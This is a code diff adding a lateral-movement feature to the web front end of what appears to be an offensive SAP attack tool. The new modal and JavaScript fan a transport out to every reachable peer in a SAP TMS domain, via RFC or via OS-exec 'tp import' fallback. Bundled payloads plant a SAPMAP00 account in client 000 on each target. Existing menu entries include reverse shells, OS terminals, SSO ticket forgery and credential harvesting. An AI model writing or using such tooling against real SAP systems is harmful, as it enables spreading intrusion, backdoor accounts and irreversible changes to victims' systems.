@@ -1256,6 +1256,7 @@ body {
       <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
       <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
       <div class="ctx-item" data-action="import_transport">&#128230; Import Local Transport (zip)</div>
+      <div class="ctx-item" data-action="tms_propagate" style="color:#f0883e">&#127919; Propagate Transport across TMS Domain</div>
       <div class="ctx-sep"></div>
       <!-- MYSAPSSO2 ticket-forgery workflow.  The SSO2 profile
            pre-flight check used to be its own menu entry; it now
@@ -1872,6 +1873,92 @@ body {
     <div class="form-actions" style="margin-top:12px">
       <button id="import-tr-go" class="btn btn-primary" onclick="runImportTransport()">Run</button>
       <button class="btn" onclick="closeModal('import-transport-modal');_stopImportTrPoll()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- TMS Propagate Transport (Bundle 3) — fan-out to every peer in the domain -->
+<div class="modal-overlay" id="tms-propagate-modal">
+  <div class="modal" style="max-width:900px;width:96vw;display:flex;flex-direction:column;max-height:92vh">
+    <h3 style="margin:0 0 6px 0">&#127919; Propagate Transport across TMS Domain
+      <span id="tms-prop-sid" style="color:#8b949e;font-size:12px"></span>
+    </h3>
+    <div id="tms-prop-form" style="overflow:auto">
+      <div style="background:#3a0f10;border:1px solid #8b0000;border-radius:4px;padding:10px 12px;margin-bottom:12px;font-size:12px;color:#ffcccc;line-height:1.5">
+        <strong style="color:#ff6b6b">&#9888;&#65039; TMS lateral movement:</strong>
+        Fans a released transport out to every reachable peer in this
+        source's TMS domain. For each target it tries the
+        <code>TMS_MGR_FORWARD/IMPORT</code> RFC path first, then falls
+        back to per-target <code>tp addtobuffer</code> + <code>tp import</code>
+        over the OS-exec channel. Successful hops receive the same
+        post-import <code>RFC_PING</code> verify as a local import — a
+        successful user-create bundle pins SAPMAP00 / client 000 on
+        every target it lands on.
+      </div>
+      <div id="tms-prop-bundled-row" style="margin-bottom:12px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
+        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
+          Bundled payloads
+        </div>
+        <div id="tms-prop-bundled-buttons" style="display:flex;flex-wrap:wrap;gap:6px">
+          <span style="color:#8b949e;font-size:12px">Loading…</span>
+        </div>
+        <div id="tms-prop-bundled-selected" style="display:none;margin-top:8px;font-size:11.5px;color:#3fb950">
+          <span id="tms-prop-bundled-sel-txt"></span>
+          <button type="button" class="btn" style="margin-left:8px;padding:2px 8px;font-size:11px"
+                  onclick="clearTMSPropBundle()">Clear</button>
+        </div>
+      </div>
+      <div class="form-row" id="tms-prop-file-row">
+        <label>&hellip; or upload your own transport zip</label>
+        <input id="tms-prop-zip" type="file" accept=".zip" style="width:100%">
+      </div>
+
+      <div class="form-row" style="display:flex;gap:12px;align-items:flex-end">
+        <div style="flex:0 0 100px">
+          <label>Target client</label>
+          <input id="tms-prop-client" type="text" value="000" maxlength="3" style="width:80px">
+          <div style="color:#8b949e;font-size:10px;margin-top:2px">Ignored by XPRA — always runs in 000</div>
+        </div>
+        <div style="flex:1">
+          <label>Path mode</label>
+          <select id="tms-prop-path-mode" style="width:100%">
+            <option value="rfc-first" selected>RFC-first, OS-exec fallback (recommended)</option>
+            <option value="rfc-only">RFC-only (skip target if RFC fails)</option>
+            <option value="os-only">OS-exec only (skip TMS RFC path)</option>
+          </select>
+        </div>
+      </div>
+
+      <div id="tms-prop-hops-row" style="margin-top:12px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
+        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
+          Reachable peers in this source's TMS domain
+        </div>
+        <div id="tms-prop-hops-preview" style="font-family:monospace;font-size:11px;color:#cfd9df">
+          (Open the modal to populate)
+        </div>
+      </div>
+
+      <div style="margin-top:14px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
+        <label for="tms-prop-dryrun" style="display:flex;align-items:center;gap:10px;cursor:pointer;margin:0;font-size:13px;color:#e6edf3">
+          <input id="tms-prop-dryrun" type="checkbox" checked
+                 style="width:18px;height:18px;flex:0 0 18px;margin:0;cursor:pointer;accent-color:#3fb950">
+          <span><strong>Dry-run only</strong> (per-target <code>tp tst</code>)</span>
+        </label>
+      </div>
+    </div>
+
+    <div id="tms-prop-progress" style="display:none;margin-top:10px">
+      <div style="font-size:12px;color:#cfd9df;margin-bottom:6px">
+        <span id="tms-prop-phase">phase</span> — <span id="tms-prop-msg">…</span>
+      </div>
+      <div id="tms-prop-grid" style="display:flex;flex-direction:column;gap:4px;font-family:monospace;font-size:11px;max-height:340px;overflow:auto"></div>
+    </div>
+
+    <div id="tms-prop-result" style="display:none;margin-top:10px;font-size:12px"></div>
+
+    <div class="form-actions" style="margin-top:12px">
+      <button id="tms-prop-go" class="btn btn-primary" onclick="runTMSPropagate()">Run</button>
+      <button class="btn" onclick="closeModal('tms-propagate-modal');_stopTMSPropPoll()">Close</button>
     </div>
   </div>
 </div>
@@ -5629,6 +5716,13 @@ function showCtxMenu(e, sid) {
     // Transports themselves are an ABAP-stack construct — a pure-Java
     // target won't have /usr/sap/trans/ or tp at all.
     'import_transport':  isAbapStack && (hasGwVuln || hasCreds) && !hasSshAccess,
+    // TMS-lateral propagation: needs an ABAP source that already has
+    // materialised TMS destinations (Bundle 1 probe run and at least
+    // one destination with logon_ok).  Post-check for logon_ok lives
+    // in the orchestrator — the menu gate just checks presence.
+    'tms_propagate': isAbapStack && (hasGwVuln || hasCreds)
+                       && !hasSshAccess
+                       && !!(n && (n.tms_destinations || []).length > 0),
     'create_user_creds': hasCreds && !hasSshAccess,
     'lpe':              isAbapStack && hasCreds && !hasSshAccess,
     'check_linux_lpe':   !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasCreds),
@@ -5905,6 +5999,12 @@ function showCtxMenu(e, sid) {
         : !isAbapStack
         ? 'Transport import requires an ABAP stack — transports are an ABAP-only construct (no /usr/sap/trans/ on pure Java).'
         : 'Needs an OS-exec channel: either a vulnerable RFC Gateway (run "Check GW Vulnerabilities") or a SAP_ALL credential (provide a verified RFC user or create one via the GW / 10KBLAZE / dpmon chains first).'),
+    'tms_propagate': (
+        !isAbapStack
+          ? 'TMS propagation runs from an ABAP source — the source system holds the transport buffer we forward from.'
+        : !(n && (n.tms_destinations || []).length)
+          ? 'No TMS destinations on this node — run Scanning → Discover TMS topology (or dump SecStore) first to materialise the domain peers.'
+        : 'Needs an OS-exec channel on this source (GW-vuln or SAP_ALL cred) so the transport zip can be staged. Downstream targets are reached via TMS forward RFCs first, then per-target OS-exec as fallback.'),
     'create_user_creds': (hasSshAccess
         ? 'Not available on SSH-only pwned hosts — user creation requires direct ABAP/RFC access.'
         : 'Provide credentials first'),
@@ -8428,6 +8528,7 @@ async function ctxAction(action) {
     case 'os_terminal': showTerminalModal(sid); break;
     case 'reverse_shell': showShellModal(sid); break;
     case 'import_transport': showImportTransportModal(sid); break;
+    case 'tms_propagate':    showTMSPropagateModal(sid); break;
     case 'create_tcpip': showTcpipModal(sid); break;
     case 'propagate': showPropagateModal(sid); break;
     case 'harvest_btp_creds': await showHarvestBtpCredsModal(sid); break;
@@ -14579,6 +14680,259 @@ function _renderImportTrResult(res) {
   if (res.post_verify && res.post_verify.verified && res.post_verify.pinned) {
     try { startPolling && startPolling(); } catch(_) {}
   }
+}
+
+// -----------------------------------------------------------------------
+// TMS Propagate Transport (Bundle 3) — fan out to every peer in the domain
+// -----------------------------------------------------------------------
+let _tmsPropSid = null;
+let _tmsPropTaskId = null;
+let _tmsPropPollTimer = null;
+let _tmsPropBundled = null;
+
+function _tmsPropRenderBundledButtons() {
+  const holder = document.getElementById('tms-prop-bundled-buttons');
+  if (!holder) return;
+  if (!_importTrBundles || !_importTrBundles.length) {
+    holder.innerHTML = '<span style="color:#8b949e;font-size:12px">'
+      + '(no bundled payloads found)</span>';
+    return;
+  }
+  holder.innerHTML = _importTrBundles.map(b => {
+    const verifyTag = b.has_post_verify
+      ? '<span style="color:#3fb950;font-size:10px;margin-left:4px">+auto-pin cred per hop</span>'
+      : '';
+    const active = (_tmsPropBundled === b.key);
+    const style = active
+      ? 'background:#0f5b3f;border:1px solid #3fb950;color:#e6edf3'
+      : 'background:#161b22;border:1px solid #30363d;color:#e6edf3';
+    return '<button type="button" class="btn"'
+      + ' style="' + style + ';padding:6px 10px;font-size:12px;text-align:left;line-height:1.3"'
+      + ' title="' + escHtml(b.description) + '"'
+      + ' onclick="pickTMSPropBundle(\'' + escHtml(b.key) + '\')">'
+      + '<div><strong>' + escHtml(b.label) + '</strong>' + verifyTag + '</div>'
+      + '<div style="color:#8b949e;font-size:10px;margin-top:2px">'
+      + escHtml(b.trkorr) + ' — ' + Math.round(b.size / 1024) + ' KB</div>'
+      + '</button>';
+  }).join('');
+}
+
+function pickTMSPropBundle(key) {
+  _tmsPropBundled = key;
+  const b = (_importTrBundles || []).find(x => x.key === key);
+  const selRow = document.getElementById('tms-prop-bundled-selected');
+  const selTxt = document.getElementById('tms-prop-bundled-sel-txt');
+  if (b && selRow && selTxt) {
+    selTxt.innerHTML = '<strong>Selected:</strong> ' + escHtml(b.label)
+      + ' <span style="color:#8b949e">(' + escHtml(b.trkorr) + ')</span>';
+    selRow.style.display = '';
+  }
+  const fileInput = document.getElementById('tms-prop-zip');
+  if (fileInput) { fileInput.value = ''; fileInput.disabled = true; }
+  const fileRow = document.getElementById('tms-prop-file-row');
+  if (fileRow) fileRow.style.opacity = '0.4';
+  _tmsPropRenderBundledButtons();
+}
+
+function clearTMSPropBundle() {
+  _tmsPropBundled = null;
+  const selRow = document.getElementById('tms-prop-bundled-selected');
+  if (selRow) selRow.style.display = 'none';
+  const fileInput = document.getElementById('tms-prop-zip');
+  if (fileInput) fileInput.disabled = false;
+  const fileRow = document.getElementById('tms-prop-file-row');
+  if (fileRow) fileRow.style.opacity = '1';
+  _tmsPropRenderBundledButtons();
+}
+
+function _tmsPropRenderHopsPreview(sid) {
+  const holder = document.getElementById('tms-prop-hops-preview');
+  if (!holder) return;
+  const n = (mapState.nodes || {})[sid];
+  const dests = (n && n.tms_destinations) || [];
+  const reachable = dests.filter(d => d && d.target_host && d.logon_ok
+                                       && d.target_sid !== sid);
+  if (!reachable.length) {
+    holder.innerHTML = '<span style="color:#f0883e">No reachable peers — '
+      + 'need TMS destinations with logon_ok. Right-click a TMSADM '
+      + 'cylinder → "Test TMSADM logon" first.</span>';
+    return;
+  }
+  holder.innerHTML = reachable.map(d => {
+    const ctrl = d.is_controller ? ' <span style="color:#39d1c4">CTRL</span>' : '';
+    return '<div>' + escHtml(d.target_sid) + ' @ ' + escHtml(d.target_host || '?')
+      + ' <span style="color:#8b949e">· domain ' + escHtml(d.domain || '?')
+      + '</span>' + ctrl + '</div>';
+  }).join('');
+}
+
+function showTMSPropagateModal(sid) {
+  _tmsPropSid = sid;
+  _tmsPropBundled = null;
+  const n = (mapState.nodes || {})[sid];
+  if (!n) return;
+  _loadImportTrBundles().then(_tmsPropRenderBundledButtons);
+  document.getElementById('tms-prop-sid').textContent = '— source: ' + sid;
+  document.getElementById('tms-prop-form').style.display = '';
+  document.getElementById('tms-prop-progress').style.display = 'none';
+  document.getElementById('tms-prop-result').style.display = 'none';
+  document.getElementById('tms-prop-go').disabled = false;
+  document.getElementById('tms-prop-go').textContent = 'Run';
+  document.getElementById('tms-prop-zip').value = '';
+  document.getElementById('tms-prop-zip').disabled = false;
+  document.getElementById('tms-prop-file-row').style.opacity = '1';
+  document.getElementById('tms-prop-bundled-selected').style.display = 'none';
+  document.getElementById('tms-prop-client').value = '000';
+  document.getElementById('tms-prop-dryrun').checked = true;
+  document.getElementById('tms-prop-path-mode').value = 'rfc-first';
+  _tmsPropRenderHopsPreview(sid);
+  document.getElementById('tms-propagate-modal').classList.add('visible');
+}
+
+async function runTMSPropagate() {
+  const sid = _tmsPropSid;
+  if (!sid) return;
+  const useBundle = !!_tmsPropBundled;
+  const fileInput = document.getElementById('tms-prop-zip');
+  if (!useBundle && !fileInput.files.length) {
+    alert('Pick a bundled payload above, or upload a transport zip.');
+    return;
+  }
+  const client   = (document.getElementById('tms-prop-client').value || '000').trim();
+  const dryRun   = document.getElementById('tms-prop-dryrun').checked;
+  const pathMode = document.getElementById('tms-prop-path-mode').value || 'rfc-first';
+
+  if (!dryRun) {
+    const n = (mapState.nodes || {})[sid];
+    const peers = ((n && n.tms_destinations) || [])
+      .filter(d => d && d.target_host && d.logon_ok && d.target_sid !== sid)
+      .map(d => d.target_sid).join(', ');
+    if (!confirm(
+        'Run REAL propagation from ' + sid + ' to: ' + peers + '\n\n' +
+        'Each target receives a tp import with U1268 unconditional flags — ' +
+        'this permanently modifies every target\'s ABAP data dictionary.\n\n' +
+        'Continue?')) return;
+  }
+
+  const fd = new FormData();
+  if (useBundle) fd.append('bundled', _tmsPropBundled);
+  else           fd.append('zip', fileInput.files[0]);
+  fd.append('target_client', client);
+  fd.append('dry_run',       dryRun ? '1' : '0');
+  fd.append('path_mode',     pathMode);
+
+  document.getElementById('tms-prop-go').disabled = true;
+  document.getElementById('tms-prop-go').textContent = 'Running…';
+  document.getElementById('tms-prop-progress').style.display = '';
+  document.getElementById('tms-prop-phase').textContent = 'submitting';
+  document.getElementById('tms-prop-msg').textContent = 'Uploading zip to SAPMAP…';
+  document.getElementById('tms-prop-grid').innerHTML = '';
+
+  let resp;
+  try {
+    const r = await fetch('/api/node/' + encodeURIComponent(sid) + '/tms_propagate',
+      {method: 'POST', body: fd});
+    resp = await r.json();
+  } catch (e) {
+    showToast('Submit failed: ' + e, 'error');
+    document.getElementById('tms-prop-go').disabled = false;
+    document.getElementById('tms-prop-go').textContent = 'Run';
+    return;
+  }
+  if (resp.error || !resp.task_id) {
+    showToast('Submit rejected: ' + (resp.error || 'no task_id'), 'error');
+    document.getElementById('tms-prop-go').disabled = false;
+    document.getElementById('tms-prop-go').textContent = 'Run';
+    return;
+  }
+  _tmsPropTaskId = resp.task_id;
+  _startTMSPropPoll();
+}
+
+function _startTMSPropPoll() {
+  _stopTMSPropPoll();
+  _tmsPropPollTimer = setInterval(_pollTMSPropProgress, 700);
+  _pollTMSPropProgress();
+}
+
+function _stopTMSPropPoll() {
+  if (_tmsPropPollTimer) {
+    clearInterval(_tmsPropPollTimer);
+    _tmsPropPollTimer = null;
+  }
+}
+
+async function _pollTMSPropProgress() {
+  if (!_tmsPropSid || !_tmsPropTaskId) return;
+  let p;
+  try {
+    const r = await fetch('/api/node/' + encodeURIComponent(_tmsPropSid)
+      + '/tms_propagate_progress?task_id=' + encodeURIComponent(_tmsPropTaskId));
+    p = await r.json();
+  } catch (_) { return; }
+  if (!p || !p.phase) return;
+
+  document.getElementById('tms-prop-phase').textContent = p.phase || '';
+  document.getElementById('tms-prop-msg').textContent = p.message || '';
+
+  const grid = document.getElementById('tms-prop-grid');
+  if (grid && Array.isArray(p.hops)) {
+    grid.innerHTML = p.hops.map(h => {
+      const statusColor =
+        h.status === 'success' ? '#3fb950' :
+        h.status === 'error'   ? '#f85149' :
+        h.status === 'skipped' ? '#8b949e' :
+        h.status === 'running' ? '#d29922' : '#8b949e';
+      const statusIcon =
+        h.status === 'success' ? '✅' :
+        h.status === 'error'   ? '❌' :
+        h.status === 'skipped' ? '⏭️' :
+        h.status === 'running' ? '⏳' : '·';
+      const pathTag = h.path ? ' <span style="color:#8b949e">[' + escHtml(h.path) + ']</span>' : '';
+      const ctrl    = h.is_controller ? ' <span style="color:#39d1c4">CTRL</span>' : '';
+      const verifyTag = h.verified
+        ? ' <span style="color:#3fb950">verified' + (h.pinned ? ' + pinned' : '') + '</span>'
+        : '';
+      return '<div style="padding:4px 6px;background:#0d1117;border:1px solid #21262d;border-radius:3px">'
+        + '<span style="color:' + statusColor + ';font-weight:600">' + statusIcon + ' '
+        + escHtml(h.target_sid) + '</span>' + ctrl + pathTag + verifyTag
+        + '<div style="color:#8b949e;font-size:10px;margin-top:2px">'
+        + escHtml(h.message || h.phase || '') + '</div>'
+        + '</div>';
+    }).join('');
+  }
+
+  if (p.phase === 'done' || p.phase === 'error') {
+    _stopTMSPropPoll();
+    document.getElementById('tms-prop-go').disabled = false;
+    document.getElementById('tms-prop-go').textContent = 'Run again';
+    _renderTMSPropResult(p.result || {});
+    // Refresh state so newly-pinned SAPMAP00 creds show up on peers.
+    try { startPolling && startPolling(); } catch(_) {}
+  }
+}
+
+function _renderTMSPropResult(res) {
+  const el = document.getElementById('tms-prop-result');
+  el.style.display = '';
+  const okCount = res.ok_count || 0;
+  const total   = res.hop_count || 0;
+  const color = res.ok ? '#3fb950' : (res.partial ? '#d29922' : '#f85149');
+  const title = res.ok ? '✅ All hops succeeded'
+    : (res.partial ? '⚠️ Partial success' : '❌ Failed');
+  let html = '<div style="color:' + color + ';font-weight:600;margin-bottom:6px">'
+    + title + ' — ' + okCount + '/' + total + ' target(s)</div>';
+  if (res.trkorr) {
+    html += '<div><b>Transport:</b> ' + escHtml(res.trkorr) + ' from '
+      + escHtml(res.source_sid || '?') + '</div>';
+  }
+  if (res.path_mode) {
+    html += '<div><b>Path mode:</b> ' + escHtml(res.path_mode) + '</div>';
+  }
+  if (res.error) {
+    html += '<div style="color:#ffcccc;margin-top:6px">' + escHtml(res.error) + '</div>';
+  }
+  el.innerHTML = html;
 }
 
 async function showShellModal(sid) {
